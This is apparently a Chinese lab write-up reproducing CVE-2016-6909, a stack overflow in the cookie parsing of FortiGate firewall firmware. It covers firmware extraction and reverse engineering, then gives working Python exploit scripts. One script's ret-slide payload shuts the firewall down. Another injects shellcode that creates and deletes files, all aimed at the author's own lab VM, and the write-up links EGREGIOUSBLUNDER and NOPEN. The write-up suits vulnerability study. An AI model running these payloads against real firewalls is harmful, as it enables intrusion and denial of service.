原文链接：[CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/252842#h2-0)

## 环境安装
参考链接：[【高级篇 / FortiGate-VM】(6.4) ❀ 02. 安装并启用 FortiGate VM ❀ FortiGate 防火墙_飞塔防火墙虚拟机_飞塔老梅子的博客-CSDN博客](https://blog.csdn.net/meigang2012/article/details/105246640)

在网上找到FGT_VM-v400-build0482下载，然后解压，双击`Fortigate-VM.orf` 用VMware打开

![](images/Pasted%20image%2020230512214210.png)

然后进行虚拟机设置，设置第一个网络适配器为VMnet8模式。

![](images/Pasted%20image%2020230512214421.png)

设置好后运行虚拟机，账号为`admin` ，密码为空。进去后进行网络设置，ip要和VMnet8在同一个网段，然后主机和防火墙就能ping通了。
```
# 显示接口信息
show system interface
# 配置静态ip
config system interface
edit port1
set mode static
set ip 192.168.219.99/24
set allowaccess ping http https fgfm snmp ssh telnet
end
```

![](images/Pasted%20image%2020230517093126.png)

通过`fnsysctl`命令可以执行一些linux基本命令。
```
fnsysctl ls
```

## 文件提取
首先将硬盘镜像 `fortios.vmdk` 挂载到 `/mnt` 目录下。

作者给出了两种方法，第一种将`fortios.vmdk`设置为虚拟机硬盘，然后使用下面命令挂载。

![](images/Pasted%20image%2020230517094848.png)

```
$ sudo fdisk -l 
... 
Device Boot Start End Sectors Size Id Type 
/dev/sdb1 * 1 262144 262144 128M 83 Linux /dev/sdb2 262145 4194304 3932160 1.9G 83 Linux 
... 
$ sudo mkdir /mnt/fortios 
$ sudo mount /dev/sdb1 /mnt/fortios
```

我用第一种方法没有成功，采用第二种方法。首先将`fortios.vmdk` 拷贝到虚拟机中，然后在对应目录下运行下面命令：
```
sudo modprobe nbd
sudo qemu-nbd -r -c /dev/nbd1 ./fortios.vmdk
sudo mount /dev/nbd1p1 /mnt/fortios
```

之后便可以在`/mnt/fortios` 目录下查看文件了

![](images/Pasted%20image%2020230517095515.png)

利用`file *` 命令查看文件类型，可以发现两个内核镜像文件 `flatkc.smp` 与 `flatkc.nosmp`

![](images/Pasted%20image%2020230517095654.png)

 `extlinux.conf` 中指定了一些基本配置，包括文件系统 `rootfs.gz`

![](images/Pasted%20image%2020230517095742.png)

解压 `rootfs.gz`

![](images/Pasted%20image%2020230517101246.png)

## 启动过程分析
### init
Linux 内核载入后会启动第一个进程 `init`，程序二进制文件通常是 `/sbin/init`，将其拖入 IDA 进行分析：

![](images/Pasted%20image%2020230517101510.png)

故 init 进程分析如下：
-   检查 `/bin.tar.xz` 是否存在，若是则创建子进程执行 `/sbin/xz --check=sha256 -d /bin.tar.xz`，父进程等待子进程结束后删除`/bin.tar.xz`，之后检查 `/bin.tar` 是否存在，若是则创建子进程执行 `/sbin/ftar -xf /bin.tar`，父进程等待子进程结束后删除`/bin.tar`
-   上一步成功后检查 `/migadmin.tar.xz` 是否存在，若是则创建子进程执行 `/sbin/xz --check=sha256 -d /migadmin.tar.xz`，父进程等待子进程结束后删除`/migadmin.tar.xz`，之后检查 `/migadmin.tar` 是否存在，若是则创建子进程执行 `/sbin/ftar -xf /migadmin.tar`，父进程等待子进程结束后删除`/migadmin.tar`
-   删除 `/sbin/xz`
-   删除 `/sbin/ftar`
-   执行 `/bin/init`

切换目录进行解压
```
sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz 
sudo chroot . /sbin/ftar -xf /bin.tar 
sudo chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz 
sudo chroot . /sbin/ftar -xf /migadmin.tar
```

### bin目录
`bin.tar.xz` 解压出来的文件基本上都是指向 `/bin/init` 与 `/bin/sysctl` 的软链接。其中诸如 `httpsd` 等网络服务都是前者的软链接，可知前者应当为该防火墙提供的基本的网络服务；而诸如 `chmod` 等常用命令都是后者的软链接，可知后者应当为类似 busybox 一样的工具库，不过更为精简。

![](images/Pasted%20image%2020230517101950.png)

![](images/Pasted%20image%2020230517102041.png)

### bin/init分析
首先会执行 `/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX` 替换自身，该文件其实是 `/bin/init` 的软链接，故这里本质上只是更改了 pid 与 argv[0]，随后会关闭三个标准文件描述符并改变当前工作目录为 `/`，打开 `/dev/null` 并创建三个指向其的文件描述符（0、1、2）。

![](images/Pasted%20image%2020230517102230.png)

启动后的界面如下：

![](images/Pasted%20image%2020230517102637.png)

## PoC
工具下载：
利用程序：
[Fortigate Firewalls - 'EGREGIOUSBLUNDER' Remote Code Execution - Hardware webapps Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/40276)

Nopen:
[AlphabugX/nopen: NOPEN Tool 又名“morerats” 莫雷斯特，是方程式工具包里的工具。 (github.com)](https://github.com/AlphabugX/nopen/tree/main)

获取一个cookie num
```
curl -X HEAD -v http://192.168.219.99/login 2>&1 | grep 'APSCOOKIE'
```

![](images/Pasted%20image%2020230513110255.png)

使用 `egregiousblunder` 测试该漏洞，如下：
```
./egregiousblunder_3.0.0.1 -t 192.168.219.99 -p 80 -l 4444 --ssl 0 --nope --gen 4nc --config EGBL.config --cookienum 3943997904 --stack 0xbffff114
```

![](images/Pasted%20image%2020230513105735.png)

此时在 fortigate 的 CLI 中我们便可以看到 httpsd 服务的崩溃信息及栈回溯
![](images/Pasted%20image%2020230513105818.png)

这里没能够成功获得一个 shell，作者初步猜测是 EGREGIOUSBLUNDER 的版本问题。

使用wireshark抓取这个过程的数据包，分析可以发现`0xbffff114` 地址被布置到了http请求头的 Cookie 中的 `AuthHash` 字段，初步推测这应当是作为一个返回地址被布置上去的，说明可能是一个栈溢出漏洞。

![](images/Pasted%20image%2020230517094250.png)

使用 postman 简单仿造该 http 请求如下，使用字符 `A` 简单填充 AuthHash 字段：
```
Cookie:
APSCOOKIE_3943997904=Era=0&Payload=YPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCrSDScPhJeOLyykfQZ0p6du+AOYKT/5qGGQ3z00ca5yQ2PGjz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8qLIjOtLB/I3e7DI6SRyGay/xxEJu30VQfm/yU/RMIL/Al+TcHpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

![](images/Pasted%20image%2020230513113918.png)

当我们的字符 A 数量达到 0x60 时再一次发生了 crash，不过这一次的栈回溯更为详细

![](images/Pasted%20image%2020230517094419.png)

为了方便构造 payload 进行利用，接下来作者选择使用 python 发送 http 请求
```
from requests import *
url = 'http://192.168.219.99/index'

headers = {
    'Content-Type':'application/json',
    'Content-Length':'12',
    'Accept':'*/*',
    'Accept-Encoding':'gzip,deflate,br',

    'User-Agent':'PostmanRuntime/7.28.3', 
    'Host':'192.168.116.100', 
    'Cookie':'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=' + 'A' * 0x60
    }

r = post(url, headers = headers)
print(r.text)
print(r.headers)
```

## 溢出点定位
根据报错信息进行栈回溯。

### 1. 0x08c38a7c

可以找到 `sub_8C389B7()` 函数
![](images/Pasted%20image%2020230517105312.png)

我们发现其最终会调用 `sub_8C38440()` 函数，简单分析我们不难知道该调用链仅仅是用于打印报错信息

![](images/Pasted%20image%2020230517105501.png)

### 2. libc offset 0x1d218
libc offset 0x1d218 处代码如下，该段代码位于 libc 中函数 `__libc_sigaction()`，用以进行 `sigreturn` 系统调用。

![](images/Pasted%20image%2020230517105821.png)

### 3. 0x8204F8D
`0x8204F8D` 的上一条指令调用了 `sub_820483B()` 函数，进入发现该函数会调用 `sub_820429D()`

![](images/Pasted%20image%2020230517110121.png)

 `sub_8329B12()` 函数调用了 `strcasecmp()`，大致分析应当是判断字符串存在性的函数，在这里传入的参数中包含字符串 `"Cookie"`，那么我们大致可以推测该函数应当是 httpsd （即本进程）中被用以处理 Cookie 相关的函数之一。

![](images/Pasted%20image%2020230517110206.png)

局部变量 v3 的求解涉及到函数 `sub_8204B9C()`如下。其最后调用的 `sub_8329797()` 传参形式应当是按格式化字符串进行解析，最终拼凑出来的形式应当如 `APSCOOKIE_114514` （示例数字）的形式

![](images/Pasted%20image%2020230517110238.png)

使用 `strstr()` 判断 v3 在 v2 中是否存在，这个形式我们与我们传入的 Cookie 的内容开头相吻合，由此我们可以推断出接下来的 `sub_820CB5E()` 函数应当涉及到对 Cookie 的解析工作。

 `sub_820CB5E()`程序如下，可以看到`sscanf` 使用了不安全的`%s` 。对 Cookie 内容的解析使用了不安全的 `%s` 读取 AuthHash 到栈上从而使得其存在栈溢出漏洞

![](images/Pasted%20image%2020230517110442.png)


## 漏洞利用
httpsd 为对 init 的软链接，首先我们先对 init 程序进行安全检查：

```shell
$ checksec ./init
[*] '/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    b'../lib:../ulib:/fortidev/lib:/lib'
```

保护全关，有相当大的操作空间。

### ret2text
先试一下是否真的能直接控制程序执行流，随便找一段 gadget 简单试一下，作者这里选用了一段关机代码
```
.text:080601AE                 push    4321FEDCh       ; howto
.text:080601B3                 call    _reboot
```

http 请求头的长度毫无疑问能够满足对 payload 的要求，故作者直接使用大量的 `ret` 指令作为 slide code，省去计算溢出长度的必要

```python
from requests import *
from pwn import *
#e = ELF('./init')
url = 'http://192.168.219.99/index'

headers = {
    'Content-Type':'application/json',
    'Content-Length':'12',
    'Accept':'*/*',
    'Accept-Encoding':'gzip,deflate,br',

    'User-Agent':'PostmanRuntime/7.28.3', 
    'Host':'192.168.219.99', 
    'Cookie':'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash=' + '\x1c\x8d\x04\x08' * 100 + '\xae\x01\x06\x08'
    }

r = post(url, headers = headers)
print(r.text)
print(r.headers)
```

运行后防火墙成功关机。

### ret2shellcode
由于没有开启 NX 保护，我们可以考虑通过`jmp esp` 的 gadget 来直接执行 shellcode.

构建shellcode创建文件并写入内容
```python
from requests import *
from pwn import *
context.arch = 'i386'
#e = ELF('./init')
url = 'http://192.168.219.99/index'

cookie = ''
cookie += 'APSCOOKIE_3943997904=Era=0&Payload=ëYÿáèøÿÿÿPQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&AuthHash='
cookie += '\x1c\x8d\x04\x08' * 100 # ret
cookie += '\xf7\xbd\x96\x08' # add eax, ebp ; jmp esp
# following are shellcode
cookie += '\x90' * 0x80 # slide code nop
cookie += '1\xc0PhflagTXjBP\xbb$\xe3\x05\x08\xff\xd31\xc9Qhnba3harttT[j\x08SP\xbb\x84\xb5\x05\x08\xff\xd3' # 'xor eax, eax ; push eax ; push 0x67616c66 ; push esp ; pop eax ; push 0102 ; push eax ; mov ebx, 0x805E324 ; call ebx ; xor ecx, ecx ; push ecx ; push 0x3361626e ; push 0x74747261 ; push esp ; pop ebx ; push 8 ; push ebx ; push eax ; mov ebx, 0x805B584 ; call ebx'
headers = {
    'Content-Type':'application/json',
    'Content-Length':'12',
    'Accept':'*/*',
    'Accept-Encoding':'gzip,deflate,br',

    'User-Agent':'PostmanRuntime/7.28.3', 
    'Host':'192.168.219.99', 
    'Cookie':cookie
    }

r = post(url, headers = headers)
print(r.text)
print(r.headers)
```

![](images/Pasted%20image%2020230517112037.png)

然后通过下列 shellcode 通过系统调用 execve 调用 `/bin/rm` 删除我们的 flag
```
cookie += '1\xc0Ph//rmh/binT[PhflagTYPQSTY\x89\xc2@@@@@@@@@@@\xcd\x80' # 'xor eax, eax ; push eax ; push 0x6d722f2f ; push 0x6e69622f ; push esp ; pop ebx ; push eax ; push 0x67616c66 ; push esp ; pop ecx ; push eax ; push ecx ; push ebx ; push esp ; pop ecx ; mov edx, eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; inc eax ; int 0x80'
```

![](images/Pasted%20image%2020230517112124.png)

## 参考链接
[(179条消息) 【高级篇 / FortiGate-VM】(6.4) ❀ 02. 安装并启用 FortiGate VM ❀ FortiGate 防火墙_fortigate虚拟机_飞塔老梅子的博客-CSDN博客](https://blog.csdn.net/meigang2012/article/details/105246640)

[(179条消息) （FortiGate）飞塔防火墙查看设备基本信息命令_weixin_33681778的博客-CSDN博客](https://blog.csdn.net/weixin_33681778/article/details/92487611)

[Fortinet SSO](https://customersso1.fortinet.com/saml-idp/jrx0g5n1etn0aoy9/login/?SAMLRequest=hZJJb9swEIX%2FisA7tTnxQtgGnBhFDWQRIreHXoIJObJZSKTKIVPn35eSuyQXF%2BBpMDPve2%2B4JOjaXmyCP5on%2FBGQfLLbrtjzQjYK1aLkRaMKfgVyymECUz57mTZXeaHmkM9Y8hUdaWtWrExzluyIAu4MeTA%2BlvJywvMpL%2Bf7fC7iu56k5az4xpJtVNEG%2FDh59L4nkWUykLdd3Ee2SBvrYgf6VNouGxC5Vn323Z3yw7Up0Jsc7Nsia%2B1Bm4wln6yTOHpYsQZawoGlAiL9in8rlbPeStveaKO0OaxYcEZYIE3CQIckvBT15v5ORC%2Fi5dxE4vN%2BX%2FHqsd6zZEOEboC%2BtYZCRK3RvWqJX57u%2Ftmg0PcR%2FqODun48s6ZAxxNLTl1rSIzRX8bofzOz9XLoFmPC7t385XH4Q8zW%2F%2BXr0IMCDyPiMnsnd9buxUPcv9tWttXybYi8A39ZfqhoxZuxVQRDPUrdaFQxy7a1P28dgo8H8i7E%2B2Trs%2BrH37j%2BBQ%3D%3D&RelayState=UmV0dXJuVXJsPUwwUnZkMjVzYjJGa0wwWnBjbTEzWVhKbFNXMWhaMlZ6TG1GemNIZz0maGtleT0%3D)

